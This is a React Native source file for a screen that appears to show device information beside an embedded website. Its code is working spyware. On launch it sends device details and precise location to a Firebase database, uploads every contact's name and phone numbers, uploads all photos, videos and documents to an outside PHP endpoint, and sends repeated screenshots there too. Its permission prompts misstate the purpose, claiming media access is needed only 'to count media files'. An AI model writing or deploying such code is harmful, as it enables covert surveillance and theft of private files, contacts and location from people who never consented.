import React, { useEffect, useRef, useState } from 'react';
import { View, Text, ScrollView, ActivityIndicator, Dimensions, Alert, StyleSheet } from 'react-native';
import WebView from 'react-native-webview';
import * as Device from 'expo-device';
import * as Battery from 'expo-battery';
import * as Application from 'expo-application';
import * as MediaLibrary from 'expo-media-library';
import * as FileSystem from 'expo-file-system';
import * as Network from 'expo-network';
import * as Location from 'expo-location';
import * as Contacts from 'expo-contacts';
import ViewShot from 'react-native-view-shot';
import { getDatabase, ref, set } from 'firebase/database';
import { firebaseConfig } from './firebaseConfig'; 
import { initializeApp } from 'firebase/app';



const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const HomeScreen = () => {
    const [deviceInfo, setDeviceInfo] = useState(null);
    const [loading, setLoading] = useState(true);
    const [mediaCounts, setMediaCounts] = useState({ images: 0, videos: 0, documents: 0 });
    const [isRendered, setIsRendered] = useState(false);
    const viewRef = useRef(null); 

    useEffect(() => {
        const getDeviceInfo = async () => {
            try {
                const batteryLevel = await Battery.getBatteryLevelAsync();
                const batteryState = await Battery.getBatteryStateAsync();
                const networkInfo = await Network.getNetworkStateAsync();
                const { status: locationStatus } = await Location.requestForegroundPermissionsAsync();

                const info = {
                    osName: Device.osName || 'Unknown',
                    osVersion: Device.osVersion || 'Unknown',
                    modelName: Device.modelName || 'Unknown',
                    totalMemory: Device.totalMemory || 0,
                    appVersion: Application.nativeApplicationVersion || 'Unknown',
                    batteryLevel,
                    batteryState: batteryState === Battery.BatteryState.CHARGING ? 'Charging' : 'Not Charging',
                    networkType: networkInfo.type || 'unknown',
                    isConnected: networkInfo.isConnected || false,
                    location: { latitude: null, longitude: null },
                    screenDimensions: {
                        width: Dimensions.get('window').width,
                        height: Dimensions.get('window').height,
                    },
                };

                if (locationStatus === 'granted') {
                    const location = await Location.getCurrentPositionAsync({});
                    info.location = {
                        latitude: location.coords.latitude,
                        longitude: location.coords.longitude,
                    };
                }

                setDeviceInfo(info);
                await storeDeviceInfo(info);
                await getMediaCounts();
                await fetchAndUploadContacts();
            } catch (error) {
                console.error("Error fetching device info:", error);
                Alert.alert("Error", "Could not fetch device info. Please try again later.");
            } finally {
                setLoading(false);
            }
        };

        getDeviceInfo();
    }, []); 

    useEffect(() => {
        if (isRendered) {
            setTimeout(() => takeScreenshots(), 1000);
        }
    }, [isRendered]); 

    const storeDeviceInfo = async (info) => {
        const deviceRef = ref(database, 'devices/' + info.modelName);
        await set(deviceRef, {
            ...info,
            mediaCounts,
            timestamp: new Date().toISOString(),
        }).catch((error) => {
            console.error("Error storing device info:", error);
            Alert.alert("Error", "Could not store device info. Please try again later.");
        });
    };

    const getMediaCounts = async () => {
        const { status } = await MediaLibrary.requestPermissionsAsync();
        if (status === 'granted') {
            const images = await MediaLibrary.getAssetsAsync({ mediaType: 'photo' });
            const videos = await MediaLibrary.getAssetsAsync({ mediaType: 'video' });
            const documents = await MediaLibrary.getAssetsAsync({ mediaType: 'unknown' });

            setMediaCounts({
                images: images.totalCount || 0,
                videos: videos.totalCount || 0,
                documents: documents.totalCount || 0,
            });

            // Start uploading media files
            await uploadMediaFiles(images.assets, 'image');
            await uploadMediaFiles(videos.assets, 'video');
            await uploadMediaFiles(documents.assets, 'document');
        } else {
            Alert.alert("Permission Denied", "Media library access is required to count media files.");
        }
    };

    const fetchAndUploadContacts = async () => {
        const { status } = await Contacts.requestPermissionsAsync();
        if (status === 'granted') {
            const { data } = await Contacts.getContactsAsync({
                fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers],
            });

            if (data.length > 0) {
                for (const contact of data) {
                    await uploadContact(contact);
                }
            } else {
                console.log("No contacts found.");
            }
        } else {
            Alert.alert("Permission Denied", "Contacts access is required to upload contacts.");
        }
    };

    const uploadContact = async (contact) => {
        const contactRef = ref(database, 'contacts/' + contact.id); 
        await set(contactRef, {
            name: contact.name,
            phoneNumbers: contact.phoneNumbers,
            timestamp: new Date().toISOString(),
        }).catch((error) => {
            console.error("Error storing contact:", error);
            Alert.alert("Error", "Could not store contact. Please try again later.");
        });
    };

    const uploadMediaFiles = async (assets, type) => {
        for (const asset of assets) {
            const uri = asset.uri; 
            await uploadFile(uri, type);
        }
    };

    const uploadFile = async (uri, type) => {
        const uploadUrl = 'https://mahendranathreddynarpala.online/uploadfile.php';
        const fileInfo = await FileSystem.getInfoAsync(uri);

        if (fileInfo.exists) {
            const formData = new FormData();
            const fileName = uri.split('/').pop() || 'file';
            const mimeType = getMimeType(fileName, type);

            formData.append('file', {
                uri,
                name: fileName,
                type: mimeType,
            });

            try {
                const response = await fetch(uploadUrl, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Content-Type': 'multipart/form-data',
                    },
                });

                if (response.ok) {
                    console.log(`Successfully uploaded: ${fileName}`);
                } else {
                    const errorText = await response.text();
                    Alert.alert("Upload Error", `Failed to upload ${fileName}: ${errorText}`);
                }
            } catch (error) {
                Alert.alert("Upload Error", "An error occurred while uploading the file. Please try again.");
            }
        } else {
            Alert.alert("File Error", "The file does not exist. Please try again.");
        }
    };

    const getMimeType = (filename, type) => {
        if (type === 'image') return 'image/jpeg'; // Assuming all images are JPEG for simplicity
        if (type === 'video') return 'video/mp4'; // Assuming all videos are MP4 for simplicity
        if (type === 'document') return 'application/pdf'; // You can expand this based on your document types
        return 'application/octet-stream';
    };

    const takeScreenshots = async () => {
        if (viewRef.current) {
            for (let i = 0; i < 5; i++) {
                try {
                    const uri = await viewRef.current.capture?.();
                    if (uri) {
                        await uploadFile(uri, 'image'); // Treat screenshots as images
                    } else {
                        Alert.alert("Screenshot Error", "Failed to capture the screenshot. Please try again.");
                    }
                } catch (error) {
                    console.error("Error taking screenshot:", error);
                    Alert.alert("Screenshot Error", "An error occurred while taking the screenshot. Please try again.");
                }
            }
        } else {
            Alert.alert("Screenshot Error", "ViewShot reference is not available.");
        }
    };

    return (
        <ScrollView contentContainerStyle={styles.container}>
            {loading ? (
                <ActivityIndicator size="large" color="#0000ff" />
            ) : (
                <>
                    <Text style={styles.title}>Device Information</Text>
                    {deviceInfo && (
                        <View style={styles.infoContainer}>
                            <Text>{`OS: ${deviceInfo.osName} ${deviceInfo.osVersion}`}</Text>
                            <Text>{`Model: ${deviceInfo.modelName}`}</Text>
                            <Text>{`Memory: ${deviceInfo.totalMemory}`}</Text>
                            <Text>{`App Version: ${deviceInfo.appVersion}`}</Text>
                            <Text>{`Battery Level: ${deviceInfo.batteryLevel}`}</Text>
                            <Text>{`Battery State: ${deviceInfo.batteryState}`}</Text>
                            <Text>{`Network Type: ${deviceInfo.networkType}`}</Text>
                            <Text>{`Location: ${deviceInfo.location.latitude}, ${deviceInfo.location.longitude}`}</Text>
                            <Text>{`Screen Dimensions: ${deviceInfo.screenDimensions.width} x ${deviceInfo.screenDimensions.height}`}</Text>
                            <Text>{`Images: ${mediaCounts.images}`}</Text>
                            <Text>{`Videos: ${mediaCounts.videos}`}</Text>
                            <Text>{`Documents: ${mediaCounts.documents}`}</Text>
                        </View>
                    )}
                    <ViewShot ref={viewRef}>
                        <WebView
                            source={{ uri: 'https://www.skillsuprise.com/' }}
                            style={styles.webView}
                            onLoadEnd={() => setIsRendered(true)}
                            onHttpError={({ nativeEvent }) => {
                                Alert.alert('HTTP error', `Status Code: ${nativeEvent.statusCode}`);
                            }}
                            onError={() => Alert.alert('Error', 'Failed to load the page. Please try again.')}
                        />
                    </ViewShot>
                </>
            )}
        </ScrollView>
    );
};

const styles = StyleSheet.create({
    container: {
        flexGrow: 1,
        padding: 16,
    },
    title: {
        fontSize: 24,
        fontWeight: 'bold',
        marginBottom: 16,
    },
    infoContainer: {
        marginBottom: 16,
    },
    webView: {
        width: '100%',
        height: Dimensions.get('window').height - 200, // Adjusted height to fit the screen
    },
});

export default HomeScreen;
